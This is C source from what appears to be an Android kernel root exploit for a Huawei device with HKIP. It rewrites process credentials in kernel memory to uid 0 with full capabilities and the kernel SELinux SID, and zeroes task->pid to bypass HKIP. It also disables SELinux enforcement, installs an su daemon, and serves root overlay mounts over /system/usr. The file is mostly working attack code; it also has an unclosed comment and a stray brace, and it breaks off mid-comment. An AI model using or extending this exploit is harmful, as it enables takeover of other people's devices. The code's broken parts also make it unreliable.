#include "common.h"

#ifdef PSELECT_WAITER_LAYOUT_5_10
#include <sys/mount.h>
#include <dirent.h>
#include <sys/vfs.h>
/* tmpfs magic; checked from the parent so the proof does not depend on any
 * output the domain-switched child might fail to deliver. */
#define TMPFS_MAGIC_LOCAL 0x01021994u
#endif

int root_child_done;
uint8_t selinux_before = 0xff;
uint8_t selinux_after = 0xff;
/* physrw fd, copied into the forked child so it can poison the AVC cache. */
static int g_kfd = -1;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
uint64_t capable_head_before;
uint64_t capable_head_after;
uint64_t init_tasks_prev;
uint64_t last_task_guess;
int setgid_ret = -1;
int setuid_ret = -1;
int setenforce_ret = -1;
int setenforce_errno;
uint64_t current_task_addr;
uint64_t current_cred_addr;
uint64_t current_real_cred_addr;
uint64_t current_cred_security_addr;
uint64_t current_real_cred_security_addr;
uint32_t cred_sid_before = 0xffffffff;
uint32_t cred_sid_after = 0xffffffff;
uint32_t real_cred_sid_before = 0xffffffff;
uint32_t real_cred_sid_after = 0xffffffff;
uint32_t target_cred_osid = SELINUX_KERNEL_SID;
uint32_t target_cred_sid = SELINUX_KERNEL_SID;
uint32_t selinux_cred_blob_off = SELINUX_CRED_BLOB_OFF;
int task_walk_iters;
uint64_t task_walk_last_entry;
uint32_t task_walk_last_pid;
uint32_t task_walk_last_tgid;
uint32_t found_task_pid;
uint32_t found_task_tgid;
char found_task_comm[TASK_COMM_LEN + 1];
pid_t root_child_pid = -1;
int root_ready_pipe[2] = {-1, -1};
struct root_shared *root_shared;

#ifdef PSELECT_WAITER_LAYOUT_5_10
#include "hkip_gate.h"

int hkip_exec_window(void) {
  if (!root_shared) {
    struct hkip_gate *g = NULL;
    if (!hkip_gate_attach(&g)) {
      return 0;
    }
    root_shared = (struct root_shared *)g;
  }
  return hkip_gate_request((struct hkip_gate *)root_shared);
}
#endif

/* Domain-string helpers.  The fd must be opened BEFORE the credential is
 * switched: the label is resolved at read() time, so one fd opened in the
 * shell domain keeps reporting correctly after the switch, and it still works
 * when the new domain cannot open /proc/self/attr/current itself. */
static int ctx_open(void);
static int ctx_read(int fd, char *buf, size_t len);

/*
 * Shared judge mailbox.  REMOVED 2026-11-12: the parent-side /proc read below
 * is strictly stronger (it needs nothing from the child), and the mailbox cost
 * ~400 B against a 752 B budget.  e18/f31 proved the child's own printf never
 * reaches the host capture after its domain changes, so nothing diagnostic
 * depends on child output any more.
 */

int spawn_root_child(void) {
  int prot = PROT_READ | PROT_WRITE;
#ifdef PSELECT_WAITER_LAYOUT_5_10
  unlink(hkip_gate_path());
  int gate = SYSCHK(open(hkip_gate_path(), O_RDWR | O_CREAT | O_TRUNC | O_CLOEXEC,
                         0666));
  if (ftruncate(gate, (off_t)HKIP_GATE_SIZE) != 0) {
    pr_info("root hkip gate ftruncate errno=%d\n", errno);
    close(gate);
    return 0;
  }
  root_shared = SYSCHK(mmap(NULL, HKIP_GATE_SIZE, prot, MAP_SHARED, gate, 0));
  close(gate);
#else
  int flags = MAP_SHARED | MAP_ANONYMOUS;
  root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
#endif
  memset(root_shared, 0, sizeof(*root_shared));
  SYSCHK(pipe(root_ready_pipe));

  root_child_pid = SYSCHK(fork());
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);

    prctl(PR_SET_NAME, "ll_root_child");
    /* Opened while still in the shell domain, read after the credential switch. */
    int ctxfd = ctx_open();
    char ctx0[64] = {0};
    (void)ctx_read(ctxfd, ctx0, sizeof(ctx0));
    char ready = 1;
    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));

    for (int i = 0; i < 5000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }
    if (!atomic_load(&root_shared->go)) {
      _exit(2);
    }

    /*
     * L5 judge.  Print the domain string FIRST: the mkdir/mount probe below is
     * measured to take the device down (e18 rebooted right after the copy
     * landed), and a kernel panic must not cost us the one datum we came for.
     * The probe runs in a grandchild so that, if it is fatal, it is fatal to a
     * throwaway process and only after the judge is already flushed.
     */
    {
      char ctx1[64] = {0};
      int cr = ctx_read(ctxfd, ctx1, sizeof(ctx1));
      pr_info("l5 child ctx '%s' -> '%s' r=%d uid=%u\n", ctx0, ctx1, cr,
              getuid());
      /*
       * The old immediate mount probe used to live here.  It ran before the
       * staged probe below and is what took the device down in i18/j44/k42
       * (k42 proved it: the staged probe's stage never left 0).  Removed so the
       * staged probe, which stamps a stage before each call, is the only thing
       * that touches mount().
       */
    }

    struct root_report report;
    memset(&report, 0, sizeof(report));
    report.uid_before = getuid();
    /*
     * Cred is already patched in place.  setuid(0)/setgid(0) on this
     * Huawei kernel hits hkip_check_xid_root and BUG if the uid is
     * not in hkip_uid_root_bits.  getuid() reads cred->uid directly.
     */
#ifdef PSELECT_WAITER_LAYOUT_5_10
    /* Official install_embedded_su path, inside the pid=0 HKIP window. */
    report.setgid_ret = 0;
    report.setgid_errno = 0;
    report.setuid_ret = 0;
    report.setuid_errno = 0;
    report.setenforce_ret = 0;
    report.setenforce_errno = 0;
    report.wallpaper_ret = 0;
    report.wallpaper_errno = 0;
    report.su_daemon_pid = -1;
    report.su_install_ret = 0;
    report.su_install_errno = 0;
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();
#else
    if (report.uid_before == 0) {
      report.setgid_ret = 0;
      report.setgid_errno = 0;
      report.setuid_ret = 0;
      report.setuid_errno = 0;
    } else {
      errno = 0;
      report.setgid_ret = setgid(0);
      report.setgid_errno = errno;
      errno = 0;
      report.setuid_ret = setuid(0);
      report.setuid_errno = errno;
    }
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();
    int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    if (enforce_fd >= 0) {
      ssize_t wrote = write(enforce_fd, "0", 1);
      report.setenforce_ret = wrote == 1 ? 0 : -1;
      report.setenforce_errno = wrote == 1 ? 0 : errno;
      close(enforce_fd);
    } else {
      report.setenforce_ret = -1;
      report.setenforce_errno = errno;
    }
    report.su_daemon_pid = -1;
    if (report.setgid_ret == 0 && report.setuid_ret == 0) {
      errno = 0;
      report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
      report.su_install_errno = errno;
      errno = 0;
      report.wallpaper_ret = install_embedded_wallpaper();
      report.wallpaper_errno = errno;
    } else {
      report.su_install_ret = 0;
      report.su_install_errno = EPERM;
      report.wallpaper_ret = 0;
      report.wallpaper_errno = EPERM;
    }
#endif
#ifdef PSELECT_WAITER_LAYOUT_5_10
    if (report.uid_after == 0) {
      atomic_store(&root_shared->done, 1);
      if (!hkip_exec_window()) {
        pr_info("root child hkip window timeout uid=%u\n", report.uid_after);
        report.su_install_ret = 0;
        report.su_install_errno = ETIMEDOUT;
        root_shared->report = report;
        _exit(3);
      }
#if 0 /* Architecture probe retired 2026-11-13: /data/adb and module_load were
      /*
       * Architecture probe (o38 already proved mount works from init).  Six
       * records, each published as seq=2k-1 BEFORE the call and seq=2k after, so
       * a panic still names the call that was in flight.  The child never
       * prints: results travel through the gate page and the parent (shell
       * domain) writes them to /data/local/tmp/l5r.log with fsync.
       *
       * 1 mkdir /data/adb          2 mkdir /data/adb/l5      3 write a file
       * 4 read a vendor .ko       5 finit_module pristine    6 finit_module
       *                                                       corrupted
       * 3 is the storage question for a manager; 5/6 decide whether the
       * "late-load kernelsu.ko" route used by the whole temporary-root family
       * is even reachable under CONFIG_MODULE_SIG_FORCE.
       */
      {
        volatile int *rp = (volatile int *)((char *)root_shared + 512);
        int i = 1;
        int r, e;
        rp[0] = 2 * i - 1;
        errno = 0; r = mkdir("/data/adb", 0777); e = errno;
        rp[i * 3 - 2] = i; rp[i * 3 - 1] = r; rp[i * 3] = e; rp[0] = 2 * i; i++;
        usleep(150000);
        rp[0] = 2 * i - 1;
        errno = 0; r = mkdir("/data/adb/l5", 0777); e = errno;
        rp[i * 3 - 2] = i; rp[i * 3 - 1] = r; rp[i * 3] = e; rp[0] = 2 * i; i++;
        usleep(150000);
        rp[0] = 2 * i - 1;
        errno = 0;
        int tf = open("/data/adb/l5/t",
                      O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
        e = errno;
        r = -1;
        if (tf >= 0) {
          r = (int)write(tf, "x", 1);
          close(tf);
        }
        rp[i * 3 - 2] = i; rp[i * 3 - 1] = r; rp[i * 3] = e; rp[0] = 2 * i; i++;
        usleep(150000);
        rp[0] = 2 * i - 1;
        errno = 0;
        int kf = open("/vendor/lib/modules/hisi_dummy_ko.ko",
                      O_RDONLY | O_CLOEXEC);
        e = errno;
        static unsigned char kb[16384];
        int kn = 0;
        if (kf >= 0) {
          kn = (int)read(kf, kb, sizeof(kb));
          close(kf);
        }
        rp[i * 3 - 2] = i; rp[i * 3 - 1] = kn; rp[i * 3] = e; rp[0] = 2 * i; i++;
        usleep(150000);
        rp[0] = 2 * i - 1;
        errno = 0; r = -1; e = 0;
        if (kn > 0) {
          int mf = (int)syscall(SYS_memfd_create, "k1", 0);
          if (mf >= 0) {
            if (write(mf, kb, (size_t)kn) == kn) {
              r = (int)syscall(SYS_finit_module, mf, "", 0);
              e = errno;
            }
            close(mf);
          }
        }
        rp[i * 3 - 2] = i; rp[i * 3 - 1] = r; rp[i * 3] = e; rp[0] = 2 * i; i++;
        usleep(150000);
        rp[0] = 2 * i - 1;
        errno = 0; r = -1; e = 0;
        if (kn > 0) {
          kb[kn / 2] ^= 0xff;
          int mf = (int)syscall(SYS_memfd_create, "k2", 0);
          if (mf >= 0) {
            if (write(mf, kb, (size_t)kn) == kn) {
              r = (int)syscall(SYS_finit_module, mf, "", 0);
              e = errno;
            }
            close(mf);
          }
        }
        rp[i * 3 - 2] = i; rp[i * 3 - 1] = r; rp[i * 3] = e; rp[0] = 2 * i;
      }
#endif
      /*
       * E2E marker: the child only has to confirm it reached the post-window
       * state.  Publishing the session on /sdcard is the PARENT's job -- only
       * the shell domain can write there, which is exactly the constraint the
       * two-half split exists for.
       */
      ((volatile int *)((char *)root_shared + 512))[0] = 1;
      pr_info("root child install_embedded_su uid=%u euid=%u gid=%u\n",
              report.uid_after, report.euid_after, report.gid_after);
      report.su_daemon_pid = getpid();
      root_shared->report = report;
      fflush(stdout);
      fflush(stderr);
      /*
       * SELinux has no runtime enforcing flag on this kernel
       * (CONFIG_SECURITY_SELINUX_DEVELOP is off, so selinux_state carries no
       * enforcing field), but one specific decision CAN be flipped: a denied
       * access inserts an avc_node, and avc_poison() sets allowed = ~0 on the
       * cached nodes.  So touch the tuple (deny), poison the cache, touch it
       * again (cache hit -> allowed), and only then try to exec the daemon.
       */
      if (getenv("CVE43499_AVC") && g_kfd >= 0) {
        const char *sud = "/data/local/tmp/su";
        errno = 0;
        int before = access(sud, X_OK);
        int berr = errno;
        int pois = 0; /* avc_poison() removed: AVC rewriting is measured
        errno = 0;
        int after = access(sud, X_OK);
        int aerr = errno;
        pr_info("avc chain before=%d/%d poison=%d after=%d/%d\n", before, berr,
                pois, after, aerr);
      }
      errno = 0;
      report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
      report.su_install_errno = errno;
      report.wallpaper_ret = 0;
      report.wallpaper_errno = 0;
      root_shared->report = report;
      /*
       * Stay resident and serve privileged requests FROM THIS PROCESS.
       *
       * This is the only place a mount can happen on this device: the child
       * runs in the init domain (SELinux allows init to mount), while the
       * parent is shell domain, and any execve would recompute the domain and
       * throw the privilege away.  So the parent (shell) writes a request into
       * the shared gate page and this loop answers it with a direct syscall.
       *
       * Command area at gate+1024:
       *   [0] seq        parent bumps it to submit
       *   [1] op         1 = overlay mount
       *   [2] result     0 = ok, else -errno
       *   [3] done seq   echoes [0] when [2] is valid
       *   +16  lowerdir, +144 upperdir, +272 target   (NUL-terminated)
       */
      for (;;) {
        volatile int *cmd = (volatile int *)((char *)root_shared + 1024);
        int seen = cmd[3];
        if (cmd[0] != seen && cmd[1] == 3) {
          /* No-op: proves the child is alive and the gate page round-trips
           * before any risky syscall is attempted. */
          cmd[2] = 0;
          cmd[4] = 9;
          cmd[3] = cmd[0];
        }
        if (cmd[0] != seen && cmd[1] == 1) {
          /*
           * Overlay with a TMPFS upper, executed inside a pid=0 HKIP window.
           *
           * Measured: calling mount() from this init-domain child with a real
           * pid resets the device at the very first mount() (stage=1).  The one
           * historical success (`l5 mnt ok=1`) ran inside a pid=0 window, so the
           * same window is used here: the child announces readiness in cmd[8]=1,
           * the parent zeroes task->pid, the child (cmd[8]==2) does the mounts,
           * and the parent restores the pid afterwards.
           *
           * cmd[4] stage (published BEFORE each call, so a crash names the call):
           *   1 tmpfs mount   2 mkdir up/wk   3 overlay mount   4 done
           */
          const char *OVL = "/system/usr";
          const char *UP = "/system/usr/up";
          const char *WK = "/system/usr/wk";
          char *lower = (char *)root_shared + 1104;
          char *targ = (char *)root_shared + 1232;
          cmd[4] = 0;
          cmd[8] = 1; /* ready: waiting for the pid=0 window */
          for (int w = 0; w < 100 && cmd[8] != 2; w++) {
            usleep(20000);
          }
          if (cmd[8] != 2) {
            cmd[2] = -999;
            cmd[3] = cmd[0];
          } else {
            cmd[4] = 1;
            usleep(200000);
            /*
             * Keep the child's work minimal: HKIP is handled by the pid=0
             * window the parent opened, and the SELinux denial is poisoned by
             * the PARENT (calling avc_poison() from inside this windowed child
             * reset the device -- measured).  A denial inserts an avc_node, so
             * the parent poisons and re-submits the whole request instead.
             */
            errno = 0;
            int rc1 = mount("tmpfs", OVL, "tmpfs", 0, "mode=0777,size=8m");
            cmd[5] = rc1 == 0 ? 0 : -errno;
            cmd[4] = 2;
            usleep(200000);
            errno = 0;
            (void)mkdir(UP, 0777);
            (void)mkdir(WK, 0777);
            cmd[6] = -errno;
            (void)mkdir(targ, 0777);
            char opts[320];
            snprintf(opts, sizeof(opts),
                     "lowerdir=%s,upperdir=%s,workdir=%s", lower, UP, WK);
            cmd[4] = 3;
            usleep(200000);
            errno = 0;
            int rc = mount("overlay", targ, "overlay", 0, opts);
            cmd[2] = rc == 0 ? 0 : -errno;
            cmd[4] = 4;
            cmd[3] = cmd[0];
          }
          cmd[8] = 0;
        }
        usleep(100000);
      }
    }
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);
    _exit(1);
#else
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);
    _exit(report.uid_after == 0 ? 0 : 1);
#endif
  }
  }

  close(root_ready_pipe[1]);

  char ready;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  return got == (ssize_t)sizeof(ready);
}

int collect_root_child(void) {
  if (!root_shared) {
    return 0;
  }
  atomic_store(&root_shared->go, 1);

  for (int i = 0; i < 5000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }
  if (!atomic_load(&root_shared->done)) {
    return 0;
  }

  struct root_report report = root_shared->report;
  root_uid_after = report.uid_after;
  setgid_ret = report.setgid_ret;
  setuid_ret = report.setuid_ret;
  setenforce_ret = report.setenforce_ret;
  setenforce_errno = report.setenforce_errno;
#ifndef PSELECT_WAITER_LAYOUT_5_10
  waitpid(root_child_pid, NULL, 0);
#endif
  return report.uid_after == 0 && report.euid_after == 0 &&
         report.gid_after == 0 && report.egid_after == 0;
}

#ifdef PSELECT_WAITER_LAYOUT_5_10
static uintptr_t root_kimage_addr(uintptr_t addr) {
  /* copy_page_to_iter wrap is not __va.  Kimage .data
   * (init_task, selinux_enforcing) is only reachable via configfs. */
  if (kaslr_done) {
    if (addr >= kaslr_base && addr < kaslr_base + 0x08000000ULL) {
      return addr;
    }
  }
  if (addr >= KIMAGE_TEXT_BASE &&
      addr < KIMAGE_TEXT_BASE + 0x08000000ULL) {
    return addr;
  }
  return 0;
}

/* Only the L5 probe may fall back to configfs for non-kimage addresses: doing it
 * unconditionally fed the slide stage contents of the WRONG page as if they were
 * success, and every run then died before install_child_root. */
static int cfg_fallback_enabled;

__attribute__((noinline))
static int root_read_data(int fd, uintptr_t addr, void *out, size_t len) {
  /*
   * Ported from JoinChang/ghostlock-oneplus src/core/umh_root.c:76-89
   * ("Read/write helpers: pipe physrw primary, configfs fallback").
   *
   * The pipe primitive only accepts direct-map addresses (its is_direct_ptr
   * guard), so a kimage address is translated with data_addr() first --
   * exactly what that file does for selinux_state before calling
   * pipe_phys_write_data().  configfs stays as the fallback, so this works
   * both before ④ and after the ashmem fops hijack is restored.
   */
  uintptr_t kimage = root_kimage_addr(addr);
  uintptr_t target = kimage ? data_addr(kimage) : addr;
  if (pipe_phys_read_data(fd, target, out, len)) {
    return 1;
  }
  /*
   * Fall back to configfs for ANY address, not just kimage ones.  The pipe
   * primitive only exists after install_pipe_physrw(), but misc.fops is already
   * hijacked by the CFI stage, so configfs_read_once works much earlier -- it
   * wraps the page at (target & ~0xfff) and can therefore touch slab objects
   * too.  Without this, find_task_by_tgid() silently returns 0 before the pipe
   * stage, which is exactly what pinned the L5 probe behind the pipe wall.
   */
  if (!kimage && !cfg_fallback_enabled) {
    return 0;
  }
  return kernel_read_data(fd, kimage ? kimage : addr, out, len) ==
         (ssize_t)len;
}

__attribute__((noinline))
static int root_write_data(
    int fd, uintptr_t addr, const void *data, size_t len) {
  uintptr_t kimage = root_kimage_addr(addr);
  uintptr_t target = kimage ? data_addr(kimage) : addr;
  if (pipe_phys_write_data(fd, target, data, len)) {
    return 1;
  }
  /* Same reasoning as root_read_data: configfs is available long before the
   * pipe primitive is. */
  if (!kimage && !cfg_fallback_enabled) {
    return 0;
  }
  return kernel_write_data(fd, kimage ? kimage : addr, data, len) ==
         (ssize_t)len;
}

static uint64_t root_read64(int fd, uintptr_t addr) {
  uint64_t value = 0;
  root_read_data(fd, addr, &value, sizeof(value));
  return value;
}

static uint32_t root_read32(int fd, uintptr_t addr) {
  uint32_t value = 0;
  root_read_data(fd, addr, &value, sizeof(value));
  return value;
}
#else
#define root_read_data pipe_phys_read_data
#define root_write_data pipe_phys_write_data
#define root_read64 pipe_read64
#define root_read32 pipe_read32
#endif

uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  uint64_t head = text_addr(INIT_TASK_TASKS);
#else
  uint64_t head = data_addr(INIT_TASK_TASKS);
#endif
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry = root_read64(fd, head);
  task_walk_iters = 0;
  task_walk_last_entry = 0;
  task_walk_last_pid = 0;
  task_walk_last_tgid = 0;

  for (int i = 0; i < 4096; i++) {
    task_walk_iters = i + 1;
    task_walk_last_entry = entry;
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry)) {
      break;
    }

    uint64_t task = entry - TASK_TASKS_OFF;
#ifdef TASK_THREAD_PID_OFF
    if (cfg_fallback_enabled && i < 4) {
      pr_info("earlyL5 hop i=%d entry=%016llx task=%016llx\n", i,
              (unsigned long long)entry, (unsigned long long)task);
    }
    uint32_t pid = 0;
    uint32_t tgid = 0;
#ifdef TASK_HKIP_XID_OFF
    if (cfg_fallback_enabled) {
      /*
       * Early (configfs) path only.  target.h records that +1600 caches
       * task->pid's pid_nr -- hkip_zero_pid_for_seq relies on it and is
       * measured to work.  Reading task + TASK_THREAD_PID_OFF on the very
       * first hop is measured to kill the process (hop i=0 prints, thrpid
       * never does), so use the cached pid here instead.
       */
      uint32_t p32 = root_read32(fd, task + TASK_HKIP_XID_OFF);
      pid = p32;
      tgid = p32;
    } else
#endif
    {
      uint64_t thread_pid = root_read64(fd, task + TASK_THREAD_PID_OFF);
      if (is_direct_ptr(thread_pid)) {
        pid = root_read32(fd, thread_pid + PID_NR_OFF);
        tgid = pid;
      }
    }
#else
    uint32_t pid = root_read32(fd, task + TASK_PID_OFF);
    uint32_t tgid = root_read32(fd, task + TASK_TGID_OFF);
#endif
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    root_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);

    /* Do not match comm unless we are looking for the original
     * root child.  Nested forks keep comm=ll_root_child and would
     * otherwise steal the walk (seq=2 want=16600 hit 16599). */
    int comm_ok = strncmp(comm, "ll_root_child", TASK_COMM_LEN) == 0;
    if (tgid == want_tgid || pid == want_tgid ||
        (want_tgid == (uint32_t)root_child_pid && comm_ok)) {
      found_task_pid = pid;
      found_task_tgid = tgid;
      memcpy(found_task_comm, comm, sizeof(found_task_comm));
      return task;
    }

    entry = root_read64(fd, task + TASK_TASKS_OFF);
  }

  return 0;
}

/*
 * Fallback identity lookup for the gate's OWN task: match task->comm instead of
 * the pid.  g77/g78 showed find_task_by_tgid() can come back empty at request
 * time even for the calling thread (the pid path chases `struct pid *` at
 * task+0x6a8 and reads pid_nr at +0x60; one bad hop anywhere in 4000 tasks
 * loses the match), while comm is a flat 16-byte field at TASK_COMM_OFF.
 */
static uint64_t find_task_by_comm(int fd, const char* want) {
  uint64_t head = text_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry = root_read64(fd, head);
  for (int i = 0; i < 8192; i++) {
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry)) {
      break;
    }
    uint64_t task = entry - TASK_TASKS_OFF;
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    if (root_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN)) {
      if (strncmp(comm, want, TASK_COMM_LEN) == 0) {
        return task;
      }
    }
    entry = root_read64(fd, task + TASK_TASKS_OFF);
  }
  return 0;
}

#ifdef PSELECT_WAITER_LAYOUT_5_10
/* The seq=1 window pins the root child's pid to 0.  A later window re-reads
 * the field as 0, so the original value must be remembered here or it is lost
 * and the task can never be given its pid back. */
static uint64_t sticky_task_addr;
static uint32_t sticky_pid1, sticky_pid2;
static int hkip_zero_pid_for_seq(
    int fd, int seq, uint64_t* task_addr, uint32_t* saved, uint32_t* saved2) {
  for (int i = 0; i < 8000; i++) {
    if (atomic_load(&root_shared->exec_armed) == seq) {
      break;
    }
    usleep(1000);
  }
  if (atomic_load(&root_shared->exec_armed) != seq) {
    return 0;
  }
  uint32_t want = (uint32_t)atomic_load(&root_shared->requester_pid);
  uint64_t task = current_task_addr;
  if (want > 0 && want != found_task_tgid && want != found_task_pid) {
    task = 0;
    for (int t = 0; t < 200 && !is_direct_ptr(task); t++) {
      task = find_task_by_tgid(fd, want);
      if (!is_direct_ptr(task)) {
        usleep(1000);
      }
    }
  }
  if (!is_direct_ptr(task)) {
    pr_info("root hkip task walk failed seq=%d want=%u\n", seq, want);
    return 0;
  }
  uint32_t p1 = 0;
  uint32_t p2 = 0;
  (void)root_read_data(fd, task + TASK_HKIP_XID_OFF, &p1, 4);
  (void)root_read_data(fd, task + TASK_HKIP_XID2_OFF, &p2, 4);
  *task_addr = task;
  *saved = p1;
  *saved2 = p2;
  uint32_t z = 0;
  int ok1 = root_write_data(fd, task + TASK_HKIP_XID_OFF, &z, 4);
  int ok2 = root_write_data(fd, task + TASK_HKIP_XID2_OFF, &z, 4);
  uint32_t b1 = 0xffffffffu;
  (void)root_read_data(fd, task + TASK_HKIP_XID_OFF, &b1, 4);
  pr_info("root hkip pid zero seq=%d want=%u task=%016llx ok=%d/%d %u->%u\n", seq,
          want, (unsigned long long)task, ok1, ok2, p1, b1);
  return ok1 && ok2;
}

/* Restores the pid fields saved by hkip_zero_pid_for_seq(). */
static int hkip_restore_pid(int fd, int seq, uint64_t task, uint32_t pid1,
                            uint32_t pid2) {
  if (!is_direct_ptr(task)) {
    return 0;
  }
  int ok1 = root_write_data(fd, task + TASK_HKIP_XID_OFF, &pid1, 4);
  int ok2 = root_write_data(fd, task + TASK_HKIP_XID2_OFF, &pid2, 4);
  uint32_t b1 = 0;
  (void)root_read_data(fd, task + TASK_HKIP_XID_OFF, &b1, 4);
  pr_info("root hkip pid restore seq=%d ok=%d/%d ->%u\n", seq, ok1, ok2, b1);
  return ok1 && ok2;
}

static void hkip_service_windows(int fd) {
  int last = 0;
  int restored = 0;
  int idle = 0;
  uint64_t last_task = 0;
  uint64_t sticky_task = 0;
  uint32_t saved = 0;
  uint32_t saved2 = 0;
  for (;;) {
    int armed = atomic_load(&root_shared->exec_armed);
    if (armed > last) {
      if (last > 0 && !restored && last_task != sticky_task) {
        hkip_restore_pid(fd, last, last_task, saved, saved2);
      }
      restored = 0;
      idle = 0;
      if (hkip_zero_pid_for_seq(fd, armed, &last_task, &saved, &saved2)) {
        last = armed;
        /* First window is ll_root_child, which execl's --daemon.
         * copy_process in the daemon hits HKIP unless pid stays 0. */
        if (sticky_task == 0) {
          sticky_task = last_task;
        }
      }
    } else if (last > 0 && !restored && last_task != sticky_task) {
      /* Client exec windows: restore after ~400ms.  The su client
       * wraps the command with `sleep 2` so exit_group sees a real pid. */
      idle++;
      if (idle >= 40) {
        hkip_restore_pid(fd, last, last_task, saved, saved2);
        restored = 1;
      }
    }
    usleep(10000);
  }
}
#endif

/* Set once `selfroot` gave this very process uid 0.  From that moment the gate
 * must never fork again: HKIP kills any task that forks with a patched cred and
 * no EL2 bit, so the forking verbs refuse to run. */
static int gate_selfrooted;
/* Our own task, captured at landing time when find_task_by_tgid() is known to
 * work; selfroot prefers it over walking the list again at request time. */
static uint64_t self_task_addr;
/* persistent root shell (shnew) */
static int g_shfd = -1;
static uint32_t g_shpid;

int patch_cred_identity(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

#ifdef PSELECT_WAITER_LAYOUT_5_10
  /*
   * uid=0 so getuid() is root.  gid=2000 so /data/local/tmp (0771
   * shell:shell) is group-writable without CAP_DAC_OVERRIDE, which
   * Huawei HKIP still blocks even with pid=0.
   */
  uint32_t ids[8] = {0, 2000, 0, 2000, 0, 2000, 0, 2000};
#else
  uint32_t ids[8] = {0};
#endif
  if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, ids, sizeof(ids))) {
    return 0;
  }

  uint32_t securebits = 0;
  if (!pipe_phys_write_data(
      fd, cred + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits))) {
    return 0;
  }

  uint64_t caps[CRED_CAP_WORDS] = {
    CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
    return 0;
  }

  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (!pipe_phys_read_data(
      fd, cred + CRED_CAPS_OFF, caps_after, sizeof(caps_after))) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      pr_info("root cap verify failed cred=%016llx idx=%zu got=%016llx want=%016llx\n",
              (unsigned long long)cred, i, (unsigned long long)caps_after[i],
              (unsigned long long)CAP_FULL);
      return 0;
    }
  }

  return 1;
}

int patch_cred_sid(int fd, uintptr_t cred) {
  uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
            (unsigned long long)cred, (unsigned long long)security);
    return 0;
  }

  uint32_t sid_pair[2] = {
    target_cred_osid, target_cred_sid,
  };
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
}

int patch_cred_object(int fd, uintptr_t cred) {
  return patch_cred_identity(fd, cred) && patch_cred_sid(fd, cred);
}

/*
 * pid=0 window on a live task, opened and closed by the PARENT.
 *
 * Measured: the init-domain child calling mount() with a real pid resets the
 * device; the same child mounts fine with task->pid zeroed (historical
 * `l5 mnt ok=1`).  TASK_HKIP_XID_OFF (1600 = 0x640) is literally task->pid, and
 * every hkip_check_* shortcut returns success when it reads 0.
 */
static uint64_t g_win_task;
static uint32_t g_win_s1, g_win_s2;

static int win_open(int fd, uint32_t pid) {
  uint64_t t = 0;
  for (int i = 0; i < 200 && !is_direct_ptr(t); i++) {
    t = find_task_by_tgid(fd, pid);
    if (!is_direct_ptr(t)) {
      usleep(3000);
    }
  }
  if (!is_direct_ptr(t)) {
    pr_info("win no task pid=%u\n", pid);
    return 0;
  }
  g_win_task = t;
  g_win_s1 = root_read32(fd, t + TASK_HKIP_XID_OFF);
  g_win_s2 = root_read32(fd, t + TASK_HKIP_XID2_OFF);
  uint32_t z = 0;
  int a = root_write_data(fd, t + TASK_HKIP_XID_OFF, &z, sizeof(z));
  int b = root_write_data(fd, t + TASK_HKIP_XID2_OFF, &z, sizeof(z));
  uint32_t back = root_read32(fd, t + TASK_HKIP_XID_OFF);
  pr_info("win open pid=%u ok=%d/%d %u/%u->%u\n", pid, a, b, g_win_s1, g_win_s2,
          back);
  return back == 0 && a && b;
}

static void win_close(int fd) {
  if (!is_direct_ptr(g_win_task)) {
    return;
  }
  (void)root_write_data(fd, g_win_task + TASK_HKIP_XID_OFF, &g_win_s1,
                        sizeof(g_win_s1));
  (void)root_write_data(fd, g_win_task + TASK_HKIP_XID2_OFF, &g_win_s2,
                        sizeof(g_win_s2));
  uint32_t back = root_read32(fd, g_win_task + TASK_HKIP_XID_OFF);
  pr_info("win close ->%u\n", back);
  g_win_task = 0;
}

/*
 * Run one command as root without ever forking *from* a patched task.
 *
 * A cred-patched task must not call fork(): HKIP reboots the device (measured
 * twice, with a shell-domain target and with a kernel-domain one).  So the
 * order is: fork first, then patch, then let the child execve.  fork() shares
